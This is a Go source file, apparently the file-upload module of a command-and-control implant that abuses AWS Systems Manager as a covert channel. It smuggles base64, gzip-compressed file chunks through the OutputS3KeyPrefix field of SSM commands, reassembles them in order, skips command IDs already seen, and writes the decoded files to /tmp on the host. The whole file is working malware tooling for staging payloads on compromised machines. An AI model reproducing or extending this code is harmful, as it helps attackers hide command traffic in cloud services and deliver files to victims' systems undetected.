package implantup

import (
	"fmt"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"

	"github.com/grines/ssmmm/awsssm"
	"github.com/grines/ssmmm/implant/implantutil"
)

var completeFile []FileParts
var history []string

type FileParts struct {
	CurrentCount int
	TotalCount   int
	Filename     string
	FileData     string
}

type File []FileParts

func (s File) Len() int {
	return len(s)
}

func (s File) Less(i, j int) bool {
	return s[i].CurrentCount < s[j].CurrentCount
}

func (s File) Swap(i, j int) {
	s[i], s[j] = s[j], s[i]
}

//Recieve each piece of the file split it by colon into a FileParts object.
//We are using the OutputS3KeyPrefix as its the largest field.
func RecieveFile(payload awsssm.SendCommandPayload) {

	s := strings.Split(payload.OutputS3KeyPrefix, ":")
	//Make sure we have a correctly formatted payload
	if len(s) == 4 {
		ccnt, _ := strconv.Atoi(s[0])
		tcnt, _ := strconv.Atoi(s[1])

		file := FileParts{
			CurrentCount: ccnt,
			TotalCount:   tcnt,
			Filename:     s[2],
			FileData:     s[3],
		}

		completeFile = append(completeFile, file)

		CheckFile(file)

	}

}

func RecieveFileDocs(payload awsssm.ListCommands) {

	for _, v := range payload.Commands {
		check := commandRan(v.CommandID)

		if !check {
			s := strings.Split(v.OutputS3KeyPrefix, ":")

			//Make sure we have a correctly formatted payload
			if len(s) == 4 {
				ccnt, _ := strconv.Atoi(s[0])
				tcnt, _ := strconv.Atoi(s[1])

				file := FileParts{
					CurrentCount: ccnt,
					TotalCount:   tcnt,
					Filename:     s[2],
					FileData:     s[3],
				}

				completeFile = append(completeFile, file)
				commandAdd(v.CommandID)

				CheckFile(file)

			}
		}
	}

}

//Check if we have all of the pieces to the file
func CheckFile(file FileParts) {
	var singleFile []FileParts

	for _, v := range completeFile {
		if v.Filename == file.Filename {
			singleFile = append(singleFile, v)
			if len(singleFile) == file.TotalCount {
				SaveFile(singleFile, v.Filename)
			}
		}
	}
}

//Save the file to the /tmp folder
func SaveFile(file File, filename string) {
	var pieces []string
	sort.Sort(file)

	for _, v := range file {
		pieces = append(pieces, v.FileData)

	}
	asone := strings.Join(pieces, "")
	decoded := implantutil.Base64Decode(asone)
	b := []byte(decoded)
	actual, err := implantutil.ReadGzFile(b)
	if err != nil {
		fmt.Println(err)
		return
	}
	d1 := []byte(actual)
	os.WriteFile("/tmp/"+filepath.Base(filename), d1, 0644)
}

//Clear file from []FileParts
func Clear() {
	completeFile = []FileParts{}
	history = []string{}
}

func commandAdd(cmd string) {

	history = append(history, cmd)
}

func commandRan(cmd string) bool {

	return contains(history, cmd)
}

func contains(s []string, str string) bool {
	for _, v := range s {
		if v == str {
			return true
		}
	}

	return false
}
